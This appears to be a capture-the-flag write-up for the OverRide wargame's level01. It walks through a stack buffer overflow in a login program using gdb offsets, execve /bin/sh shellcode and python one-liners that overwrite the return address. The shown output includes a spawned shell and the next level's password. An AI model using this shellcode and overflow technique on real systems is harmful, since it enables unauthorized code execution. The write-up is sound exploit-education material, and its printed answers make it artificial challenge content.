# level01

The program asks for an username and after a password.

By looking at the code, we can see that the `verify_user_name` function, compare our input, copied in a global variable <a_user_name>, with "dat_wil". The program exits if not true.

The `verify_user_pass` compare our input, copied in a local variable in main, with "admin". But even if the password is good or not, the program exits.

We first try to overwrite `eip`: we can see that the local buffer have a size of 68 bytes, and the 2nd `fgets` read 100 bytes. We can calculate the length between the beginning of the buffer and `eip`:

```gdb
(gdb) info frame
Stack level 0, frame at 0xffffd740:
 eip = 0x8048574 in main; saved eip 0xf7e45513
 Arglist at 0xffffd738, args: 
 Locals at 0xffffd738, Previous frame's sp is 0xffffd740
 Saved registers:
  ebx at 0xffffd730, ebp at 0xffffd738, edi at 0xffffd734, eip at 0xffffd73c
(gdb) p/d 0xffffd73c-0xffffd6ec
$13 = 80
```

Then we need an address to put our shellcode. It can be on the local buffer, before the `eip` address, or in the global variable <a_user_name>.

With global variable:

The address is hardcoded and have at least a length of 108 bytes minus 7 for "dat_wil":

```gdb
Breakpoint 1, 0x0804852d in main ()
(gdb) x/28wx 0x0804a040
0x804a040 <a_user_name>:        0x5f746164      0x0a6c6977      0x00000000      0x00000000
0x804a050 <a_user_name+16>:     0x00000000      0x00000000      0x00000000      0x00000000
0x804a060 <a_user_name+32>:     0x00000000      0x00000000      0x00000000      0x00000000
0x804a070 <a_user_name+48>:     0x00000000      0x00000000      0x00000000      0x00000000
0x804a080 <a_user_name+64>:     0x00000000      0x00000000      0x00000000      0x00000000
0x804a090 <a_user_name+80>:     0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0 <a_user_name+96>:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) p/d 0x804a0a0+12 - 0x804a040
$1 = 108
(gdb) p/x 0x804a040 + 7
$5 = 0x804a047
```

Exploit the program:

```bash
level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "\x41" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cd /home/users/level02
cat .pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

With local buffer:

Without the environment in `gdb`:

```gdb
(gdb) set exec-wrapper env -u LINES -u COLUMNS
(gdb) b *0x08048574
Breakpoint 1 at 0x8048574
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil 
verifying username....

Enter Password: 

Breakpoint 1, 0x08048574 in main ()
(gdb) x $esp+0x1c
0xffffd69c:     0x00000000
```

Try to exploit:

```bash
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41" * (80 - 28) + "\x9c\xd6\xff\xff"'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
Segmentation fault (core dumped)
```

With environment in `gdb`:

```gdb
(gdb) b *0x08048574
Breakpoint 1 at 0x8048574
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 

Breakpoint 1, 0x08048574 in main ()
(gdb) x $esp+0x1c
0xffffd68c:     0x00000000
```

Try to exploit:

```bash
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41" * (80 - 28) + "\x8c\xd6\xff\xff"';cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
Segmentation fault (core dumped)
```

We get the address with `ltrace` in a real environment:

```bash
level01@OverRide:~$ ltrace ./level01 
...
"admin\n", 100, 0xf7fcfac0)                          = 0xffffd6ac
```

Exploit the program:

```bash
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41" * (80 - 28) + "\xac\xd6\xff\xff"';cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
```
